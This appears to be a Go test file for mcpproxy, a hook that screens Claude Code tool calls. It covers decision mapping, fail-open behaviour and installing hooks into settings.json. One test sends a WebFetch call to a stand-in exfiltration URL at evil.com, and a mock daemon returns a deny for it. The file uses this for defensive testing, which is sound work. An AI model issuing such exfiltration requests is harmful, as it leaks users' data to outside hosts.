package main

import (
	"encoding/json"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestTranslateToClaudeCode tests mapping of internal decisions to Claude Code protocol
func TestTranslateToClaudeCode(t *testing.T) {
	tests := []struct {
		name     string
		decision string
		expected string
	}{
		{"allow maps to approve", "allow", "approve"},
		{"warn maps to approve", "warn", "approve"},
		{"ask maps to ask", "ask", "ask"},
		{"deny maps to block", "deny", "block"},
		{"unknown defaults to approve", "unknown", "approve"},
		{"empty defaults to approve", "", "approve"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := translateToClaudeCode(tc.decision)
			assert.Equal(t, tc.expected, result)
		})
	}
}

// TestBuildClaudeCodeResponse tests Claude Code response format construction
func TestBuildClaudeCodeResponse(t *testing.T) {
	t.Run("approve response", func(t *testing.T) {
		resp := buildClaudeCodeResponse("approve", "")
		assert.Equal(t, "approve", resp["decision"])
	})

	t.Run("block response with reason", func(t *testing.T) {
		resp := buildClaudeCodeResponse("block", "exfiltration detected")
		assert.Equal(t, "block", resp["decision"])
		assert.Equal(t, "exfiltration detected", resp["reason"])
	})

	t.Run("ask response with reason", func(t *testing.T) {
		resp := buildClaudeCodeResponse("ask", "suspicious flow detected")
		assert.Equal(t, "ask", resp["decision"])
		assert.Equal(t, "suspicious flow detected", resp["reason"])
	})

	t.Run("response is valid JSON", func(t *testing.T) {
		resp := buildClaudeCodeResponse("block", "test reason")
		data, err := json.Marshal(resp)
		require.NoError(t, err)
		assert.Contains(t, string(data), `"decision":"block"`)
	})
}

// TestFailOpen_UnreachableDaemon tests fail-open behavior when daemon is unreachable
func TestFailOpen_UnreachableDaemon(t *testing.T) {
	result := evaluateViaSocket("/nonexistent/mcpproxy-test-hook.sock", []byte(`{
		"event": "PreToolUse",
		"session_id": "s1",
		"tool_name": "WebFetch",
		"tool_input": {"url": "https://example.com"}
	}`))

	// Should return approve on connection error (fail-open)
	assert.Equal(t, "approve", result.Decision)
}

// TestDetectHookSocketPath tests that socket path detection returns a non-empty path
func TestDetectHookSocketPath(t *testing.T) {
	path := detectHookSocketPath()
	assert.NotEmpty(t, path, "socket path should not be empty")
}

// TestEvaluateViaSocket_WithMockServer tests end-to-end evaluation via Unix socket
func TestEvaluateViaSocket_WithMockServer(t *testing.T) {
	// Use /tmp directly to avoid macOS 104-byte Unix socket path limit
	socketPath := filepath.Join(os.TempDir(), "mcp-hook-test.sock")
	os.Remove(socketPath)
	t.Cleanup(func() { os.Remove(socketPath) })

	// Start a mock HTTP server on the Unix socket
	listener, err := net.Listen("unix", socketPath)
	require.NoError(t, err)
	defer listener.Close()

	mux := http.NewServeMux()
	mux.HandleFunc("/api/v1/hooks/evaluate", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		resp := map[string]interface{}{
			"decision":   "deny",
			"reason":     "exfiltration detected",
			"risk_level": "critical",
			"flow_type":  "internal_to_external",
		}
		json.NewEncoder(w).Encode(resp)
	})

	server := &http.Server{Handler: mux}
	go server.Serve(listener)
	defer server.Close()

	result := evaluateViaSocket(socketPath, []byte(`{
		"event": "PreToolUse",
		"session_id": "s1",
		"tool_name": "WebFetch",
		"tool_input": {"url": "https://evil.com/exfil"}
	}`))

	assert.Equal(t, "deny", result.Decision)
	assert.Equal(t, "exfiltration detected", result.Reason)
}

// TestEvaluateViaSocket_ServerError tests fail-open on server error
func TestEvaluateViaSocket_ServerError(t *testing.T) {
	socketPath := filepath.Join(os.TempDir(), "mcp-hook-err.sock")
	os.Remove(socketPath)
	t.Cleanup(func() { os.Remove(socketPath) })

	listener, err := net.Listen("unix", socketPath)
	require.NoError(t, err)
	defer listener.Close()

	mux := http.NewServeMux()
	mux.HandleFunc("/api/v1/hooks/evaluate", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte(`{"error": "internal error"}`))
	})

	server := &http.Server{Handler: mux}
	go server.Serve(listener)
	defer server.Close()

	result := evaluateViaSocket(socketPath, []byte(`{
		"event": "PreToolUse",
		"session_id": "s1",
		"tool_name": "Read",
		"tool_input": {}
	}`))

	// Should fail-open on server error
	assert.Equal(t, "approve", result.Decision)
}

// TestHookEvaluateOutputFormat tests the full output format for Claude Code
func TestHookEvaluateOutputFormat(t *testing.T) {
	// Capture stdout
	oldStdout := os.Stdout
	r, w, _ := os.Pipe()
	os.Stdout = w
	defer func() { os.Stdout = oldStdout }()

	writeClaudeCodeResponse("block", "exfiltration detected")

	w.Close()
	var buf [4096]byte
	n, _ := r.Read(buf[:])
	output := string(buf[:n])

	// Output should be valid JSON
	var parsed map[string]interface{}
	err := json.Unmarshal([]byte(output), &parsed)
	require.NoError(t, err, "output should be valid JSON: %s", output)

	assert.Equal(t, "block", parsed["decision"])
	assert.Equal(t, "exfiltration detected", parsed["reason"])
}

// === Phase 8: Hook Install/Uninstall/Status Tests (T070) ===

// TestGenerateClaudeCodeHooks tests the generated hook configuration structure
func TestGenerateClaudeCodeHooks(t *testing.T) {
	hooks := generateClaudeCodeHooks()

	require.Len(t, hooks.PreToolUse, 1, "must have one PreToolUse hook")
	require.Len(t, hooks.PostToolUse, 1, "must have one PostToolUse hook")

	pre := hooks.PreToolUse[0]
	post := hooks.PostToolUse[0]

	// PreToolUse matcher includes required tools
	requiredTools := []string{"Read", "Glob", "Grep", "Bash", "Write", "Edit", "WebFetch", "WebSearch", "Task", "mcp__.*"}
	for _, tool := range requiredTools {
		assert.Contains(t, pre.Matcher, tool,
			"PreToolUse matcher must include %s", tool)
	}

	// PreToolUse command
	assert.Contains(t, pre.Command, "mcpproxy hook evaluate")
	assert.Contains(t, pre.Command, "--event PreToolUse")

	// PostToolUse matcher matches PreToolUse
	assert.Equal(t, pre.Matcher, post.Matcher, "PostToolUse matcher should match PreToolUse")

	// PostToolUse must be async
	assert.True(t, post.Async, "PostToolUse must have async: true")

	// PostToolUse command
	assert.Contains(t, post.Command, "mcpproxy hook evaluate")
	assert.Contains(t, post.Command, "--event PostToolUse")
}

// TestGenerateClaudeCodeHooks_NoSecrets tests that no API keys or port numbers appear
func TestGenerateClaudeCodeHooks_NoSecrets(t *testing.T) {
	hooks := generateClaudeCodeHooks()

	// Marshal to JSON and check for sensitive patterns
	data, err := json.Marshal(hooks)
	require.NoError(t, err)
	configStr := string(data)

	assert.NotContains(t, configStr, "api_key", "must not contain API key references")
	assert.NotContains(t, configStr, "apikey", "must not contain API key references")
	assert.NotContains(t, configStr, ":8080", "must not contain port numbers")
	assert.NotContains(t, configStr, "localhost", "must not contain localhost")
	assert.NotContains(t, configStr, "127.0.0.1", "must not contain IP addresses")
}

// TestInstallHooksToFile_CreatesNewFile tests that install creates settings file
func TestInstallHooksToFile_CreatesNewFile(t *testing.T) {
	tmpDir := t.TempDir()
	settingsPath := filepath.Join(tmpDir, ".claude", "settings.json")

	err := installHooksToFile(settingsPath)
	require.NoError(t, err)

	// File should exist
	data, err := os.ReadFile(settingsPath)
	require.NoError(t, err)

	// Parse and verify
	var settings map[string]interface{}
	err = json.Unmarshal(data, &settings)
	require.NoError(t, err)

	hooks, ok := settings["hooks"].(map[string]interface{})
	require.True(t, ok, "settings must have hooks key")

	preToolUse, ok := hooks["PreToolUse"].([]interface{})
	require.True(t, ok, "hooks must have PreToolUse")
	require.Len(t, preToolUse, 1)

	postToolUse, ok := hooks["PostToolUse"].([]interface{})
	require.True(t, ok, "hooks must have PostToolUse")
	require.Len(t, postToolUse, 1)

	// Verify PostToolUse async
	postEntry, ok := postToolUse[0].(map[string]interface{})
	require.True(t, ok)
	assert.Equal(t, true, postEntry["async"])
}

// TestInstallHooksToFile_MergesExisting tests that install preserves existing settings
func TestInstallHooksToFile_MergesExisting(t *testing.T) {
	tmpDir := t.TempDir()
	settingsDir := filepath.Join(tmpDir, ".claude")
	err := os.MkdirAll(settingsDir, 0755)
	require.NoError(t, err)

	settingsPath := filepath.Join(settingsDir, "settings.json")

	// Create existing settings with other content
	existing := map[string]interface{}{
		"model":       "claude-sonnet-4-20250514",
		"permissions": []string{"read", "write"},
		"hooks": map[string]interface{}{
			"PreToolUse": []interface{}{
				map[string]interface{}{
					"matcher": "CustomTool",
					"command": "custom-checker",
				},
			},
		},
	}
	existingData, _ := json.MarshalIndent(existing, "", "  ")
	err = os.WriteFile(settingsPath, existingData, 0644)
	require.NoError(t, err)

	// Install hooks
	err = installHooksToFile(settingsPath)
	require.NoError(t, err)

	// Read and verify
	data, err := os.ReadFile(settingsPath)
	require.NoError(t, err)

	var settings map[string]interface{}
	err = json.Unmarshal(data, &settings)
	require.NoError(t, err)

	// Other settings preserved
	assert.Equal(t, "claude-sonnet-4-20250514", settings["model"], "existing settings should be preserved")

	// Hooks merged
	hooks, ok := settings["hooks"].(map[string]interface{})
	require.True(t, ok)

	preToolUse, ok := hooks["PreToolUse"].([]interface{})
	require.True(t, ok)
	// Should have both: existing custom hook + mcpproxy hook
	assert.GreaterOrEqual(t, len(preToolUse), 2, "existing PreToolUse hooks should be preserved")

	// PostToolUse should be added
	postToolUse, ok := hooks["PostToolUse"].([]interface{})
	require.True(t, ok)
	assert.Len(t, postToolUse, 1)
}

// TestUninstallHooksFromFile_RemovesHooks tests that uninstall removes mcpproxy hooks
func TestUninstallHooksFromFile_RemovesHooks(t *testing.T) {
	tmpDir := t.TempDir()
	settingsDir := filepath.Join(tmpDir, ".claude")
	err := os.MkdirAll(settingsDir, 0755)
	require.NoError(t, err)

	settingsPath := filepath.Join(settingsDir, "settings.json")

	// Install first
	err = installHooksToFile(settingsPath)
	require.NoError(t, err)

	// Uninstall
	err = uninstallHooksFromFile(settingsPath)
	require.NoError(t, err)

	// Read and verify
	data, err := os.ReadFile(settingsPath)
	require.NoError(t, err)

	var settings map[string]interface{}
	err = json.Unmarshal(data, &settings)
	require.NoError(t, err)

	// Settings file still exists but hooks section should be empty or absent
	hooks, ok := settings["hooks"].(map[string]interface{})
	if ok {
		// If hooks key exists, check mcpproxy entries are removed
		if preList, ok := hooks["PreToolUse"].([]interface{}); ok {
			for _, entry := range preList {
				if entryMap, ok := entry.(map[string]interface{}); ok {
					cmd, _ := entryMap["command"].(string)
					assert.NotContains(t, cmd, "mcpproxy", "mcpproxy hooks should be removed")
				}
			}
		}
		if postList, ok := hooks["PostToolUse"].([]interface{}); ok {
			for _, entry := range postList {
				if entryMap, ok := entry.(map[string]interface{}); ok {
					cmd, _ := entryMap["command"].(string)
					assert.NotContains(t, cmd, "mcpproxy", "mcpproxy hooks should be removed")
				}
			}
		}
	}
}

// TestUninstallHooksFromFile_PreservesOtherHooks tests that uninstall keeps non-mcpproxy hooks
func TestUninstallHooksFromFile_PreservesOtherHooks(t *testing.T) {
	tmpDir := t.TempDir()
	settingsDir := filepath.Join(tmpDir, ".claude")
	err := os.MkdirAll(settingsDir, 0755)
	require.NoError(t, err)

	settingsPath := filepath.Join(settingsDir, "settings.json")

	// Create settings with both mcpproxy and custom hooks
	settings := map[string]interface{}{
		"hooks": map[string]interface{}{
			"PreToolUse": []interface{}{
				map[string]interface{}{
					"matcher": "CustomTool",
					"command": "custom-checker",
				},
				map[string]interface{}{
					"matcher": "Read|Glob|Grep",
					"command": "mcpproxy hook evaluate --event PreToolUse",
				},
			},
		},
	}
	data, _ := json.MarshalIndent(settings, "", "  ")
	err = os.WriteFile(settingsPath, data, 0644)
	require.NoError(t, err)

	// Uninstall
	err = uninstallHooksFromFile(settingsPath)
	require.NoError(t, err)

	// Read and verify
	data, err = os.ReadFile(settingsPath)
	require.NoError(t, err)

	var result map[string]interface{}
	err = json.Unmarshal(data, &result)
	require.NoError(t, err)

	hooks := result["hooks"].(map[string]interface{})
	preList := hooks["PreToolUse"].([]interface{})
	assert.Len(t, preList, 1, "should keep the custom hook")

	entry := preList[0].(map[string]interface{})
	assert.Equal(t, "custom-checker", entry["command"], "custom hook should be preserved")
}

// TestCheckHookInstalled tests hook installation detection
func TestCheckHookInstalled(t *testing.T) {
	tmpDir := t.TempDir()
	settingsPath := filepath.Join(tmpDir, "settings.json")

	// Not installed (no file)
	assert.False(t, checkHookInstalled(settingsPath), "should not be installed when file doesn't exist")

	// Install
	err := installHooksToFile(settingsPath)
	require.NoError(t, err)

	// Now installed
	assert.True(t, checkHookInstalled(settingsPath), "should be installed after install")

	// Uninstall
	err = uninstallHooksFromFile(settingsPath)
	require.NoError(t, err)

	// Not installed again
	assert.False(t, checkHookInstalled(settingsPath), "should not be installed after uninstall")
}

// TestResolveSettingsPath tests settings path resolution for different scopes
func TestResolveSettingsPath(t *testing.T) {
	t.Run("project scope", func(t *testing.T) {
		path, err := resolveSettingsPath("project")
		require.NoError(t, err)
		assert.True(t, strings.HasSuffix(path, filepath.Join(".claude", "settings.json")),
			"project scope should use .claude/settings.json, got: %s", path)
	})

	t.Run("user scope", func(t *testing.T) {
		path, err := resolveSettingsPath("user")
		require.NoError(t, err)
		home, _ := os.UserHomeDir()
		assert.True(t, strings.HasPrefix(path, home),
			"user scope should be under home directory, got: %s", path)
		assert.True(t, strings.HasSuffix(path, filepath.Join(".claude", "settings.json")))
	})

	t.Run("invalid scope", func(t *testing.T) {
		_, err := resolveSettingsPath("invalid")
		assert.Error(t, err, "invalid scope should return error")
	})
}

// TestGetHookStatusInfo tests hook status reporting
func TestGetHookStatusInfo(t *testing.T) {
	tmpDir := t.TempDir()
	settingsPath := filepath.Join(tmpDir, "settings.json")
	socketPath := "/nonexistent/mcpproxy.sock"

	t.Run("not installed", func(t *testing.T) {
		status := getHookStatusInfo(settingsPath, socketPath)
		assert.False(t, status.Installed)
		assert.False(t, status.DaemonReachable)
	})

	t.Run("installed but daemon unreachable", func(t *testing.T) {
		err := installHooksToFile(settingsPath)
		require.NoError(t, err)

		status := getHookStatusInfo(settingsPath, socketPath)
		assert.True(t, status.Installed)
		assert.False(t, status.DaemonReachable)
		assert.Equal(t, "claude-code", status.AgentType)
	})
}
